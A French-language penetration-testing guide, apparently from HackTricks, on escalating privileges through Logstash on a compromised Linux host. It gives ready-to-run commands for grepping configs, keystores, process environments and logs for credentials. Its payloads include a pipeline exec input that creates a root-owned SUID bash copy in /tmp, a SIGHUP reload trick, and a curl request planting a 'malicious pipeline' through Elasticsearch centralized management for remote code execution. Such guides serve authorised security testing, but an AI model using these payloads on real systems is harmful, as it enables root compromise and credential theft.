# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash est utilisé pour **collecter, transformer et acheminer des logs** via un système connu sous le nom de **pipelines**. Ces pipelines sont composés d'étapes **input**, **filter** et **output**. Un aspect intéressant apparaît lorsque Logstash fonctionne sur une machine compromise.

### Configuration des pipelines

Les pipelines sont configurés dans le fichier **/etc/logstash/pipelines.yml**, qui liste les emplacements des configurations de pipeline :
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ce fichier indique où se trouvent les fichiers **.conf** contenant les configurations des pipelines.

En utilisant un **Elasticsearch output module**, il est courant que les **pipelines** contiennent des **Elasticsearch credentials**, qui possèdent souvent des privilèges étendus du fait que Logstash doit écrire des données dans Elasticsearch. Les wildcards dans les chemins de configuration permettent à Logstash d'exécuter tous les pipelines correspondants dans le répertoire indiqué.

Si Logstash est démarré avec `-f <directory>` au lieu de `pipelines.yml`, **tous les fichiers à l'intérieur de ce répertoire sont concaténés dans l'ordre lexicographique et analysés comme une seule configuration**. Cela crée deux implications offensives :

- Un fichier déposé comme `000-input.conf` ou `zzz-output.conf` peut modifier la façon dont le pipeline final est assemblé
- Un fichier malformé peut empêcher le chargement de tout le pipeline, donc validez soigneusement les payloads avant de vous fier à l'auto-reload

### Énumération rapide sur un hôte compromis

Sur une machine où Logstash est installé, inspectez rapidement :
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Vérifiez également si l'API de monitoring locale est accessible. Par défaut elle écoute sur **127.0.0.1:9600**, ce qui est généralement suffisant après avoir obtenu l'accès à l'hôte:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Cela vous donne généralement les IDs de pipeline, des détails d'exécution, et la confirmation que votre pipeline modifié a été chargé.

Les identifiants récupérés depuis Logstash débloquent souvent **Elasticsearch**, donc consultez [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Élévation de privilèges via des pipelines modifiables

Pour tenter une élévation de privilèges, identifiez d'abord l'utilisateur sous lequel le service Logstash s'exécute, typiquement l'utilisateur **logstash**. Assurez-vous de satisfaire **un** des critères suivants :

- Avoir un **accès en écriture** à un fichier de pipeline **.conf** **ou**
- Le fichier **/etc/logstash/pipelines.yml** utilise un wildcard, et vous pouvez écrire dans le dossier cible

De plus, **une** des conditions suivantes doit être remplie :

- Capacité à redémarrer le service Logstash **ou**
- Le fichier **/etc/logstash/logstash.yml** a **config.reload.automatic: true** défini

Si un wildcard est présent dans la configuration, créer un fichier correspondant à ce wildcard autorise l'exécution de commandes. Par exemple :
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ici, **interval** détermine la fréquence d'exécution en secondes. Dans l'exemple donné, la commande **whoami** s'exécute toutes les 120 secondes, et sa sortie est dirigée vers **/tmp/output.log**.

Avec **config.reload.automatic: true** dans **/etc/logstash/logstash.yml**, Logstash détectera et appliquera automatiquement les configurations de pipeline nouvelles ou modifiées sans redémarrage. S'il n'y a pas de wildcard, il est toujours possible de modifier des configurations existantes, mais il convient de faire preuve de prudence pour éviter des perturbations.

### Pipeline payloads plus fiables

Le plugin d'entrée `exec` fonctionne toujours dans les versions actuelles et exige soit un `interval`, soit un `schedule`. Il s'exécute par **forking** de la JVM de Logstash, donc si la mémoire est limitée, votre payload peut échouer avec `ENOMEM` au lieu de s'exécuter silencieusement.

Un payload de privilege-escalation plus pratique est généralement celui qui laisse un artefact durable :
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si vous n'avez pas les droits de redémarrage mais pouvez envoyer un signal au processus, Logstash prend également en charge un rechargement déclenché par **SIGHUP** sur les systèmes de type Unix :
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Notez que tous les plugins ne sont pas compatibles avec le rechargement automatique. Par exemple, l'input **stdin** empêche le rechargement automatique, donc n'assumez pas que `config.reload.automatic` prendra toujours en compte vos modifications.

### Voler des secrets de Logstash

Avant de vous concentrer uniquement sur l'exécution de code, récoltez les données auxquelles Logstash a déjà accès :

- Les identifiants en clair sont souvent codés en dur dans `elasticsearch {}` outputs, `http_poller`, JDBC inputs, ou les paramètres liés au cloud
- Les paramètres sécurisés peuvent se trouver dans **`/etc/logstash/logstash.keystore`** ou dans un autre répertoire `path.settings`
- Le mot de passe du keystore est fréquemment fourni via **`LOGSTASH_KEYSTORE_PASS`**, et les installations basées sur des paquets le récupèrent souvent depuis **`/etc/sysconfig/logstash`**
- L'expansion des variables d'environnement avec `${VAR}` est résolue au démarrage de Logstash, donc l'environnement du service mérite d'être inspecté

Vérifications utiles :
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Cela vaut aussi la peine d'être vérifié car **CVE-2023-46672** a montré que Logstash pouvait enregistrer des informations sensibles dans les logs dans des circonstances spécifiques. Sur un hôte post-exploitation, d'anciens logs Logstash et les entrées `journald` peuvent donc divulguer des identifiants même si la configuration actuelle référence le keystore au lieu de stocker les secrets en ligne.

### Abus de gestion centralisée des pipelines

Dans certains environnements, l'hôte ne dépend **pas** du tout des fichiers `.conf` locaux. Si **`xpack.management.enabled: true`** est configuré, Logstash peut récupérer des pipelines gérés centralement depuis Elasticsearch/Kibana, et après activation de ce mode les configs de pipeline locales ne sont plus la source de vérité.

Cela implique un chemin d'attaque différent :

1. Récupérer les identifiants Elastic depuis les paramètres locaux de Logstash, le keystore ou les logs
2. Vérifier si le compte dispose du privilège de cluster **`manage_logstash_pipelines`**
3. Créer ou remplacer un pipeline géré centralement afin que l'hôte Logstash exécute votre payload lors de son prochain intervalle de sondage

L'API Elasticsearch utilisée pour cette fonctionnalité est :
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ceci est particulièrement utile lorsque les fichiers locaux sont en lecture seule mais que Logstash est déjà enregistré pour récupérer des pipelines à distance.

## Références

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
